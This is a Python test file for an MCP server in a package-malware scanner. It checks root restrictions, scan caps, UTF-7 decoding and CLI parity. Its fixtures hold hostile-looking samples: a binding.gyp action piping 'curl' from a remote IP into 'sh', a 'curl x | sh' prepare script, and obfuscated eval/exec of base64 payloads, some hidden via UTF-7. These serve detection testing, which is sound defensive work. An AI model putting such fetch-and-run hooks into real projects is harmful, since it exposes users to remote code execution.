"""Review findings 18a/18b (tools) and 8 (MCP scan_files).

a. run_project_scan diverged from the CLI: binding.gyp went through
   scan_manifest (a `curl … | sh` action passed the gate), flow.analyze was
   unguarded, skipped trees were never reported and their global list never
   reset between calls.
b. No root restriction and no budget: LAZARET_MCP_ROOTS limits the paths a
   tool may read; LAZARET_MCP_MAX_FILES / _MAX_BYTES / _MAX_SECONDS cap one
   call, which then returns partial results marked incomplete.
8. scan_files ignored PEP 263 cookies (UTF-7 code hidden in a comment).
15. discover_packages left packages whose scan raised out of `flagged` and
   never tracked them.
Also: a registry store failure no longer throws away scan_package's verdict.
"""

import atexit
import datetime
import json
import os
import shutil
import tempfile
import unittest
from unittest import mock

from lazaret.mcp import server
from lazaret.registry import repo
from lazaret.scanner import core as lazaret
from tests.registry._review_support import tarball

CURL_GYP = json.dumps({"targets": [{"target_name": "x", "actions": [
    {"action_name": "a", "inputs": [], "outputs": ["o"],
     "action": ["sh", "-c", "curl -s http://192.0.2.1/x | sh"]}]}]})


def tree(files):
    root = tempfile.mkdtemp(prefix="lz-mcp-tools-")
    atexit.register(shutil.rmtree, root, True)
    for rel, body in files.items():
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(body)
    return root


class ProjectScanParityTests(unittest.TestCase):
    def test_binding_gyp_goes_through_scan_gyp(self):
        root = tree({"binding.gyp": CURL_GYP, "index.js": "module.exports = 1;\n"})
        out = server.tool_quality_gate({"path": root})
        self.assertEqual(out["qualityGate"], "FAILED")
        res = server.run_project_scan(root)
        self.assertIn(("SC-INSTALL-HOOK", "CRITICAL"), {(i["rule"], i["sev"]) for i in res["issues"]})

    def test_skipped_trees_reported_and_reset_per_call(self):
        root = tree({"a.py": "x = 1\n", "gen/b.py": "y = 2\n"})
        for _ in range(2):
            res = server.run_project_scan(root, exclude=["gen"])
            skipped = [i for i in res["issues"] if i["rule"] == "Q-SKIPPED-TREE"]
            self.assertEqual(len(skipped), 1)
            self.assertEqual(skipped[0]["file"], "gen")

    def test_flow_failure_is_a_note_not_a_failed_call(self):
        root = tree({"a.py": "x = 1\n"})
        flow = mock.Mock()
        flow.analyze.side_effect = AttributeError("boom")
        with mock.patch.object(lazaret, "lazaret_flow", flow):
            out = server.tool_scan_directory({"path": root})
        self.assertIn("interprocedural taint analysis skipped (AttributeError: boom)", out["notes"])

    def test_same_findings_as_the_cli_pipeline(self):
        root = tree({"package.json": json.dumps({"scripts": {"postinstall": "node x.js"}}),
                     "binding.gyp": CURL_GYP, "x.js": "eval(atob('eA=='));\n",
                     "node_modules/dep/package.json": json.dumps({"scripts": {"prepare": "curl x | sh"}})})
        files, manifests, binary = lazaret.collect_files(root, [], include_deps=False)
        want = list(binary)
        for f in files:
            want += lazaret.scan_file(f["path"], f["content"], f["lang"], dep=f.get("dep", False))
        for mf in manifests:
            want += (lazaret.scan_gyp(mf["path"], mf["content"]) if mf["path"].endswith("binding.gyp")
                     else lazaret.scan_manifest(mf["path"], mf["content"],
                                                registry=lazaret.is_dependency_manifest(mf["path"])))
        got = server.run_project_scan(root)["issues"]
        key = lambda i: (i["rule"], i["file"], i["line"], i["sev"])        # noqa: E731
        self.assertTrue(want)
        self.assertEqual(set(map(key, want)) - set(map(key, got)), set())


class RootsTests(unittest.TestCase):
    def test_paths_outside_the_roots_are_tool_errors(self):
        inside = tree({"a.py": "x = 1\n"})
        outside = tree({"b.py": "y = 2\n"})
        os.symlink(outside, os.path.join(inside, "escape"))
        with mock.patch.dict(os.environ, {"LAZARET_MCP_ROOTS": os.pathsep.join(["/nonexistent", inside])}):
            self.assertIn("qualityGate", server.tool_scan_directory({"path": inside}))
            server.tool_scan_files({"paths": [os.path.join(inside, "a.py")]})
            for call in (lambda: server.tool_scan_directory({"path": outside}),
                         lambda: server.tool_quality_gate({"path": outside}),
                         lambda: server.tool_scan_directory({"path": os.path.join(inside, "escape")}),
                         lambda: server.tool_scan_files({"paths": [os.path.join(inside, "a.py"),
                                                                   os.path.join(outside, "b.py")]})):
                with self.assertRaisesRegex(ValueError, "LAZARET_MCP_ROOTS"):
                    call()

    def test_no_restriction_by_default(self):
        with mock.patch.dict(os.environ, {"LAZARET_MCP_ROOTS": ""}):
            self.assertEqual(server.allowed_roots(), [])


class CapsTests(unittest.TestCase):
    def test_file_cap_makes_the_directory_scan_incomplete(self):
        root = tree({f"m{i}.py": "x = 1\n" for i in range(5)})
        with mock.patch.dict(os.environ, {"LAZARET_MCP_MAX_FILES": "3"}):
            out = server.tool_scan_directory({"path": root})
        self.assertTrue(out["incomplete"])
        self.assertEqual(out["qualityGate"], "FAILED")
        self.assertIn("SC-TRUNCATED", {i["rule"] for i in out["issues"]})

    def test_byte_cap(self):
        root = tree({"a.py": "x = 1\n" * 1000})
        with mock.patch.dict(os.environ, {"LAZARET_MCP_MAX_BYTES": "100"}):
            self.assertTrue(server.tool_scan_directory({"path": root})["incomplete"])

    def test_time_cap_returns_partial_results(self):
        root = tree({f"m{i}.py": "x = 1\n" for i in range(5)})
        with mock.patch.dict(os.environ, {"LAZARET_MCP_MAX_SECONDS": "0.000001"}):
            out = server.tool_scan_directory({"path": root})
        self.assertTrue(out["incomplete"])
        self.assertIn("time budget", out["incompleteReason"])

    def test_scan_files_caps(self):
        root = tree({f"m{i}.py": "x = 1\n" for i in range(3)})
        paths = [os.path.join(root, f"m{i}.py") for i in range(3)]
        with mock.patch.dict(os.environ, {"LAZARET_MCP_MAX_FILES": "2"}):
            out = server.tool_scan_files({"paths": paths})
        self.assertTrue(out["incomplete"])
        self.assertIn("issueCount", out["files"][paths[1]])
        self.assertIn("not scanned", out["files"][paths[2]]["error"])

    def test_defaults_and_bad_values(self):
        with mock.patch.dict(os.environ, {"LAZARET_MCP_MAX_FILES": "lots", "LAZARET_MCP_MAX_SECONDS": "-1"}):
            ctx = server.ToolContext()
        self.assertEqual((ctx.max_files, ctx.max_seconds), (20_000, 300.0))


class ScanFilesDecodingTests(unittest.TestCase):
    def test_utf7_cookie(self):
        root = tempfile.mkdtemp(prefix="lz-mcp-u7-")
        path = os.path.join(root, "u7.py")
        with open(path, "w", encoding="ascii") as fh:
            fh.write("# -*- coding: utf-7 -*-\n"
                     "#+AAo-import base64+ADs-exec(base64.b64decode(+ACc-cHJpbnQoMSk=+ACc-))\n")
        out = server.tool_scan_files({"paths": [path]})
        found = {(i["rule"], i["sev"]) for i in out["files"][path]["issues"]}
        self.assertIn(("SC-UTF7", "CRITICAL"), found)
        self.assertEqual(out["worstSeverity"], "BLOCKER" if ("SC-EVAL-DECODE", "BLOCKER") in found
                         else "CRITICAL")

    def test_bom_and_nul(self):
        root = tempfile.mkdtemp(prefix="lz-mcp-bom-")
        path = os.path.join(root, "a.js")
        with open(path, "wb") as fh:
            fh.write(b"\xef\xbb\xbf/*\x00*/\neval(atob('eA=='));\n")
        out = server.tool_scan_files({"paths": [path]})
        self.assertIn("Q-ENCODING", {i["rule"] for i in out["files"][path]["issues"]})


class ScanPackageStoreTests(unittest.TestCase):
    def test_store_failure_keeps_the_verdict(self):
        tgz = tarball({"package.json": json.dumps({"name": "b", "scripts": {"postinstall": "node i.js"}}),
                       "i.js": "1\n"})
        rv = ("1.0.0", "https://registry.npmjs.org/b/-/b-1.0.0.tgz", "tgz", "npm", {})
        with tempfile.TemporaryDirectory() as d, \
                mock.patch.object(server, "REGISTRY_DB", os.path.join(d, "r.db")), \
                mock.patch.object(repo, "resolve_npm", return_value=rv), \
                mock.patch.object(repo, "http_bytes", return_value=tgz), \
                mock.patch.object(repo, "verify_digest", return_value=None), \
                mock.patch.object(repo.Store, "save_scan", side_effect=OSError("disk full")):
            out = server.tool_scan_package({"spec": "npm:b"})
        self.assertEqual(out["verdict"], "WARN")
        self.assertEqual(out["storeError"], "OSError: disk full")



NOW = datetime.datetime.now(datetime.timezone.utc)
GOOD_TGZ = tarball({"package.json": json.dumps({"name": "g"}), "index.js": "module.exports = 1;\n"})


class McpDiscoverTests(unittest.TestCase):
    def test_failed_scans_are_flagged_and_tracked(self):
        hostile = GOOD_TGZ[:len(GOOD_TGZ) // 2]          # truncated download: INCOMPLETE
        arts = {"good": GOOD_TGZ, "evil": hostile}

        def resolve(name, version):
            if name == "gone":
                raise repo.FetchError("HTTP 404 fetching https://registry.npmjs.org/gone/1.0.0")
            return ("1.0.0", f"https://registry.npmjs.org/{name}/-/{name}-1.0.0.tgz", "tgz", "npm", {})
        found = [("npm", "good", "1.0.0", NOW), ("npm", "evil", "1.0.0", NOW),
                 ("npm", "gone", "1.0.0", NOW)]
        with tempfile.TemporaryDirectory() as d, \
                mock.patch.object(server, "REGISTRY_DB", os.path.join(d, "r.db")), \
                mock.patch.object(repo, "discover_pypi", return_value=[]), \
                mock.patch.object(repo, "discover_npm", return_value=found), \
                mock.patch.object(repo, "resolve_npm", side_effect=resolve), \
                mock.patch.object(repo, "http_bytes", side_effect=lambda u: arts[u.split("/")[3]]), \
                mock.patch.object(repo, "verify_digest", return_value=None):
            out = server.tool_discover_packages({"since": "1d", "scan": True})
            tracked = {p["package"]: p["verdict"] for p in server.tool_registry_status({})["packages"]}
        flagged = {f["package"]: f["verdict"] for f in out["flagged"]}
        self.assertEqual(flagged, {"npm:evil@1.0.0": "INCOMPLETE", "npm:gone@1.0.0": "INCOMPLETE"})
        self.assertIn("HTTP 404", next(f["error"] for f in out["flagged"] if "gone" in f["package"]))
        self.assertEqual(tracked, {"npm:evil": "INCOMPLETE", "npm:gone": None, "npm:good": "OK"})


if __name__ == "__main__":
    unittest.main()
